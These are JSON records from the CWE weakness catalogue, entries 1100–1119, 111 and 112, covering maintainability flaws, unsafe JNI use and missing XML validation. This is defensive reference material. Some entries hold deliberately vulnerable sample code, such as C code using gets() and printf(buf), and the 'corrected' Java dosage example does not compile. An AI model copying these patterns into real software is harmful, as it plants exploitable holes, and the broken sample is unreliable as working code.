{"ID": "1100", "Name": "Insufficient Isolation of System-Dependent Functions", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product or code does not isolate system-dependent\n\t\t\t\t\tfunctionality into separate standalone modules.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1101", "Name": "Reliance on Runtime Component in Generated Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses automatically-generated code that cannot be\n\t\t\t\t\texecuted without a specific runtime support component.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1102", "Name": "Reliance on Machine-Dependent Data Representation", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code uses a data representation that relies on low-level\n\t\t\t\t\tdata representation or constructs that may vary across different processors,\n\t\t\t\t\tphysical machines, OSes, or other physical components.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "758", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "1105", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1103", "Name": "Use of Platform-Dependent Third Party Components", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product relies on third-party components that do\n\t\t\t\t\tnot provide equivalent functionality across all desirable\n\t\t\t\t\tplatforms.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "758", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1104", "Name": "Use of Unmaintained Third Party Components", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product relies on third-party components that are not\n\t\t\t\t\tactively supported or maintained by the original developer or a trusted proxy\n\t\t\t\t\tfor the original developer.", "ExtendedDescription": "\n\nReliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.\n\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1357", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1105", "Name": "Insufficient Encapsulation of Machine-Dependent Functionality", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product or code uses machine-dependent functionality, but\n\t\t\t\t\tit does not sufficiently encapsulate or isolate this functionality from\n\t\t\t\t\tthe rest of the code.", "ExtendedDescription": "\n\nThis issue makes it more difficult to port or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "758", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "DemonstrativeExamples": [{"ID": "DX-216", "Entries": [{"IntroText": "In this example function, the memory address of variable b is derived by adding 1 to the address of variable a. This derived address is then used to assign the value 0 to b."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tvoid example() {\n\t\tchar a;\n\t\tchar b;\n\t\t*(&a + 1) = 0;\n\t}\n```"}, {"BodyText": "Here, b may not be one byte past a. It may be one byte in front of a. Or, they may have three bytes between them because they are aligned on 32-bit boundaries."}]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1106", "Name": "Insufficient Use of Symbolic Constants", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code uses literal constants that may need to change\n\t\t\t\t\tor evolve over time, instead of using symbolic constants.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1107", "Name": "Insufficient Isolation of Symbolic Constant Definitions", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code uses symbolic constants, but it does not\n\t\t\t\t\tsufficiently place the definitions of these constants into a more centralized or\n\t\t\t\t\tisolated location.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1108", "Name": "Excessive Reliance on Global Variables", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code is structured in a way that relies too much on using\n\t\t\t\t\tor setting global variables throughout various points in the code, instead of\n\t\t\t\t\tpreserving the associated information in a narrower, more local\n\t\t\t\t\tcontext.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1109", "Name": "Use of Same Variable for Multiple Purposes", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains a callable, block, or other code element in\n\t\t\t\t\twhich the same variable is used to control more than one unique task or store\n\t\t\t\t\tmore than one instance of data.", "ExtendedDescription": "\n\nUse of the same variable for multiple purposes can make it more difficult for a person to read or understand the code, potentially hiding other quality issues.\n\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "111", "Name": "Direct Use of Unsafe JNI", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.", "ExtendedDescription": "Many safety features that programmers may take for granted do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "695", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Implement error handling around the JNI call."}, {"Phase": ["Implementation"], "Strategy": "Refactoring", "Description": "Do not use JNI calls if you don't trust the native library."}, {"Phase": ["Implementation"], "Strategy": "Refactoring", "Description": "Be reluctant to use JNI calls. A Java API equivalent may exist."}], "DemonstrativeExamples": [{"ID": "DX-196", "Entries": [{"IntroText": "The following code defines a class named Echo. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user. The following C code defines the native method implemented in the Echo class:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tclass Echo {\n\t\t\tpublic native void runEcho();\n\t\t\tstatic {\n\t\t\t\t\tSystem.loadLibrary(\"echo\");\n\t\t\t}\n\t\t\tpublic static void main(String[] args) {\n\t\t\t\t\tnew Echo().runEcho();\n\t\t\t}\n\t}\n```"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#include <jni.h>\n\t#include \"Echo.h\"//the java class above compiled with javah\n\t#include <stdio.h>\n\tJNIEXPORT void JNICALL\n\tJava_Echo_runEcho(JNIEnv *env, jobject obj)\n\t{\n\t\tchar buf[64];\n\t\tgets(buf);\n\t\tprintf(buf);\n\t}\n```"}, {"BodyText": "Because the example is implemented in Java, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although Java does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in source code written in other languages that are accessed using the Java Native Interface. Despite the memory protections offered in Java, the C code in this example is vulnerable to a buffer overflow because it makes use of gets(), which does not check the length of its input."}, {"BodyText": "The Sun Java(TM) Tutorial provides the following description of JNI [See Reference]: The JNI framework lets your native method utilize Java objects in the same way that Java code uses these objects. A native method can create Java objects, including arrays and strings, and then inspect and use these objects to perform its tasks. A native method can also inspect and use objects created by Java application code. A native method can even update Java objects that it created or that were passed to it, and these updated objects are available to the Java application. Thus, both the native language side and the Java side of an application can create, update, and access Java objects and then share these objects between them."}, {"BodyText": "The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of the C source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between Java and native methods expands the potential risk to much more insidious cases where improper data handling in Java may lead to unexpected vulnerabilities in native code or unsafe operations in native code corrupt data structures in Java. Vulnerabilities in native code accessed through a Java application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the Java application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information exposure in the Java application that reveals its use of JNI [See Reference]."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1110", "Name": "Incomplete Design Documentation", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product's design documentation does not adequately describe\n\t\t\t\t\tcontrol flow, data flow, system initialization, relationships between tasks,\n\t\t\t\t\tcomponents, rationales, or other important aspects of the\n\t\t\t\t\tdesign.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1059", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1111", "Name": "Incomplete I/O Documentation", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product's documentation does not adequately define inputs,\n\t\t\t\t\toutputs, or system/software interfaces.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1059", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1112", "Name": "Incomplete Documentation of Program Execution", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The document does not fully define all mechanisms that are used\n\t\t\t\t\tto control or influence how product-specific programs are\n\t\t\t\t\texecuted.", "ExtendedDescription": "\n\nThis includes environmental variables, configuration files, registry keys, command-line switches or options, or system settings.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1059", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1113", "Name": "Inappropriate Comment Style", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code uses comment styles or formats that are\n\t\t\t\t\tinconsistent or do not follow expected standards for the\n\t\t\t\t\tproduct.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product due to insufficient legibility, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1114", "Name": "Inappropriate Whitespace Style", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code contains whitespace that is inconsistent across\n\t\t\t\t\tthe code or does not follow expected standards for the\n\t\t\t\t\tproduct.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1115", "Name": "Source Code Element without Standard Prologue", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code contains elements such as source files \n\t\t\t\t\tthat do not consistently provide a prologue or header that has been\n\t\t\t\t\tstandardized for the project.", "ExtendedDescription": "\n\nThe lack of a prologue can make it more difficult to accurately and quickly understand the associated code. Standard prologues or headers may contain information such as module name, version number, author, date, purpose, function, assumptions, limitations, accuracy considerations, etc.\n\n\nThis issue makes it more difficult to maintain the product due to insufficient analyzability, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1116", "Name": "Inaccurate Comments", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code contains comments that do not accurately\n\t\t\t\t\tdescribe or explain aspects of the portion of the code with which the comment is\n\t\t\t\t\tassociated.", "ExtendedDescription": "\n\nWhen a comment does not accurately reflect the associated code elements, this can introduce confusion to a reviewer (due to inconsistencies) or make it more difficult and less efficient to validate that the code is implementing the intended behavior correctly.\n\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Verify that each comment accurately reflects what is intended to happen during execution of the code."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following Java example the code performs a calculation to determine how much medicine to administer. A comment is provided to give insight into what the calculation shoud be doing. Unfortunately the comment does not match the actual code and thus leaves the reader to wonder which is correct."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "public class Main {\n\n```\n\t public static void main(String[] args) { \n\t\t int pt_weight = 83;\n\t\t int mg_per_kg = 3;\n\t\t int daily_dose = 0;\n\t\t // Add the patient weight and Mg/Kg to calculate the correct daily dose\n\t\t daily_dose = pt_weight * mg_per_kg;\n\t\t return dosage; \n\t } \n }\n```"}, {"BodyText": "In the correction below, the code functionality has been verified, and the comment has been corrected to reflect the proper calculation."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "public class Main {\n\n```\n\t public static void main(String[] args) { \n\t\t int pt_weight = 83;\n\t\t int mg_per_kg = 3;\n\t\t int daily_dose = 0;\n\t\t // Multiply the patient weight and Mg/Kg to calculate the correct daily dose\n\t\t daily_dose = pt_weight * mg_per_kg;\n\t\t return dosage; \n\t } \n }\n```"}, {"BodyText": "Note that in real-world code, these values should be validated to disallow negative numbers, prevent integer overflow, etc."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1117", "Name": "Callable with Insufficient Behavioral Summary", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains a function or method whose signature and/or associated\n\t\t\t\t\tinline documentation does not sufficiently describe the callable's inputs, outputs,\n\t\t\t\t\tside effects, assumptions, or return codes.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1078", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1118", "Name": "Insufficient Documentation of Error Handling Techniques", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The documentation does not sufficiently describe the techniques\n\t\t\t\t\tthat are used for error handling, exception processing, or similar\n\t\t\t\t\tmechanisms.", "ExtendedDescription": "\n\nDocumentation may need to cover error handling techniques at multiple layers, such as module, executable, compilable code unit, or callable.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1059", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1119", "Name": "Excessive Use of Unconditional Branching", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code uses too many unconditional branches (such as\n\t\t\t\t\t\"goto\").", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "112", "Name": "Missing XML Validation", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product accepts XML from an untrusted source but does not validate the XML against the proper schema.", "ExtendedDescription": "Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1286", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Unexpected State"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Strategy": "Input Validation", "Description": "\n\nAlways validate XML input against a known XML Schema or DTD.\n\n\nIt is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code loads and parses an XML file."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n```\n// Read DOM* \n\ttry {\n\t```\n\t\t...\n\t\tDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n\t\tfactory.setValidating( false );\n\t\t....\n\t\tc_dom = factory.newDocumentBuilder().parse( xmlFile );\n\t} catch(Exception ex) {\n\t\t...\n\t}\n```"}, {"BodyText": "The XML file is loaded without validating it against a known XML Schema or DTD."}]}, {"Entries": [{"IntroText": "The following code creates a DocumentBuilder object to be used in building an XML document."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tDocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();\n\tbuilderFactory.setNamespaceAware(true);\n\tDocumentBuilder builder = builderFactory.newDocumentBuilder();\n```"}, {"BodyText": "The DocumentBuilder object does not validate an XML document against a schema, making it possible to create an invalid XML document."}]}], "RelatedAttackPatterns": ["230", "231"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-1359", "Description": "A vulnerability in the configuration management of Cisco AsyncOS for Cisco Web Security Appliance (WSA) could allow an authenticated, remote attacker to perform command injection and elevate privileges to root. This vulnerability is due to insufficient validation of user-supplied XML input for the web interface. An attacker could exploit this vulnerability by uploading crafted XML configuration files that contain scripting code to a vulnerable device. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system and elevate privileges to root. An attacker would need a valid user account with the rights to upload configuration files to exploit this vulnerability."}, {"Reference": "CVE-2022-39353", "Description": "xmldom is a pure JavaScript W3C standard-based (XML DOM Level 2 Core) `DOMParser` and `XMLSerializer` module. xmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing. This breaks the assumption that there is only a single root node in the tree, which led to issuance of CVE-2022-39299 as it is a potential issue for dependents. Update to @xmldom/xmldom@~0.7.7, @xmldom/xmldom@~0.8.4 (dist-tag latest) or @xmldom/xmldom@>=0.9.0-beta.4 (dist-tag next). As a workaround, please one of the following approaches depending on your use case: instead of searching for elements in the whole DOM, only search in the `documentElement`or reject a document with a document that has more then 1 `childNode`."}]}
